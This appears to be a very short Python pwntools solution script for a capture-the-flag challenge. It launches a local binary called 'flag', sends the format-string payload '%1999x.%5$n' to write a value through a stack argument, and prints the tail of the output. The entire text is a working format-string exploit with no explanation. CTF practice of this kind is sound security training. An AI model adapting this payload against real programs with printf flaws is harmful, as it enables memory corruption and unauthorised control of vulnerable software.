#!/usr/bin/python
from pwn import *
p = process('flag')
fs = "%1999x.%5$n"
p.sendline(fs)
print p.read().split('.')[-1]
